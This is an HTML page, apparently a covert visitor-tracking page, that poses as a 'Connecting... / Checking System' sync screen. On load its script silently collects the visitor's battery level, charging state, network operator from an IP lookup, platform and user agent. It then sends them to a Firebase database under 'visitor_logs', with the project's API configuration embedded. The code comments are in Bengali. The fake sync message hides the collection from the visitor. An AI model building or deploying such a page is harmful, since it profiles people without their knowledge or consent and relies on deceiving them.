<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting...</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f0f2f5; margin: 0; }
        .status-card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #333; margin-bottom: 10px; }
        p { color: #666; }
    </style>
</head>
<body>

    <div class="status-card">
        <div class="loader" id="loader"></div>
        <h2 id="msg-title">Checking System</h2>
        <p id="msg-desc">Please wait while we sync with the server...</p>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";

        // ১. আপনার দেওয়া কনফিগুরেশন (সংশোধিত appId সহ)
        const firebaseConfig = {
            apiKey: "AIzaSyCYURRZWYSVcFmU6XW1pd13lRQI8OGHwO4",
            authDomain: "zara-996c9.firebaseapp.com",
            databaseURL: "https://zara-996c9-default-rtdb.firebaseio.com",
            projectId: "zara-996c9",
            storageBucket: "zara-996c9.firebasestorage.app",
            messagingSenderId: "931526344980",
            appId: "1:931526344980:web:a989c698466bc8648b8201"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        async function startSync() {
            let batteryLevel = "Unknown";
            let isCharging = "Unknown";
            let networkOperator = "Unknown";

            try {
                // ২. ব্যাটারি তথ্য সংগ্রহ
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    batteryLevel = Math.round(battery.level * 100) + "%";
                    isCharging = battery.charging ? "Yes" : "No";
                }

                // ৩. নেটওয়ার্ক অপারেটর সংগ্রহ (HTTPS API)
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const netData = await response.json();
                    networkOperator = netData.org || "Mobile/WiFi Data";
                } catch (e) {
                    networkOperator = "Blocked by Browser";
                }

                // ৪. Firebase Realtime Database-এ ডেটা পাঠানো
                const logsRef = ref(db, 'visitor_logs');
                await push(logsRef, {
                    battery_percent: batteryLevel,
                    charging: isCharging,
                    operator: networkOperator,
                    device: navigator.platform,
                    browser: navigator.userAgent,
                    timestamp: new Date().toLocaleString()
                });

                // UI আপডেট
                document.getElementById('loader').style.display = 'none';
                document.getElementById('msg-title').innerText = "Sync Complete!";
                document.getElementById('msg-desc').innerText = "Everything is up to date.";

            } catch (error) {
                console.error("Firebase Error:", error);
                document.getElementById('msg-title').innerText = "Sync Failed";
                document.getElementById('msg-desc').innerText = "Please check your internet connection.";
            }
        }

        // পেজ লোড হলে ফাংশনটি চালু হবে
        window.addEventListener('load', startSync);
    </script>
</body>
</html>
